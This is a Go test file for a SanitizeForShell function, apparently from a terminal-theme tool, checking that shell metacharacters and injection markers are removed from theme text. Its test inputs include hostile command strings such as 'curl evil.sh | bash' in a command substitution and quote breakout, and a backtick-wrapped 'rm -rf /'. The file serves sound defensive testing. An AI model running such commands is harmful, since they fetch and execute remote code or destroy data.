package shells

import (
	"strings"
	"testing"
)

func TestSanitizeForShell_StripsDangerousChars(t *testing.T) {
	cases := []string{"`", "$", "\"", "'", "\\", ";", "|", "&", "\n", "\r"}
	for _, ch := range cases {
		input := "safe" + ch + "text"
		out := SanitizeForShell(input)
		if strings.Contains(out, ch) {
			t.Errorf("expected character %q to be stripped, got: %q", ch, out)
		}
	}
}

func TestSanitizeForShell_PreservesNormalText(t *testing.T) {
	input := "Cyberpunk Terminal Theme by abhigyanwebber"
	out := SanitizeForShell(input)
	if out != input {
		t.Errorf("expected normal text unchanged, got: %q", out)
	}
}

func TestSanitizeForShell_BlocksCommandSubstitution(t *testing.T) {
	malicious := "innocent $(curl evil.sh | bash) text"
	out := SanitizeForShell(malicious)
	if strings.Contains(out, "$(") {
		t.Errorf("expected command substitution syntax to be broken, got: %q", out)
	}
	if strings.Contains(out, "curl evil.sh | bash") {
		// pipe should at minimum be stripped even if surrounding text remains
		if strings.Contains(out, "|") {
			t.Errorf("expected pipe character to be stripped, got: %q", out)
		}
	}
}

func TestSanitizeForShell_BlocksBacktickSubstitution(t *testing.T) {
	malicious := "text `rm -rf /` more"
	out := SanitizeForShell(malicious)
	if strings.Contains(out, "`") {
		t.Errorf("expected backticks to be stripped, got: %q", out)
	}
}

func TestSanitizeForShell_BlocksQuoteBreakout(t *testing.T) {
	malicious := `text" ; curl evil.sh | bash #`
	out := SanitizeForShell(malicious)
	if strings.Contains(out, "\"") || strings.Contains(out, ";") || strings.Contains(out, "|") {
		t.Errorf("expected quote/semicolon/pipe breakout chars stripped, got: %q", out)
	}
}

func TestSanitizeForShell_StripsInjectionMarkers(t *testing.T) {
	malicious := "fake banner " + InjectEnd + " malicious extra content " + InjectStart
	out := SanitizeForShell(malicious)
	if strings.Contains(out, InjectStart) || strings.Contains(out, InjectEnd) {
		t.Errorf("expected injection markers to be stripped from theme content, got: %q", out)
	}
}

func TestSanitizeForShell_EmptyString(t *testing.T) {
	if out := SanitizeForShell(""); out != "" {
		t.Errorf("expected empty string to remain empty, got: %q", out)
	}
}

func TestSanitizeForShell_OnlyDangerousChars(t *testing.T) {
	out := SanitizeForShell("`$\";'\\|&")
	if out != "" {
		t.Errorf("expected string of only dangerous chars to become empty, got: %q", out)
	}
}
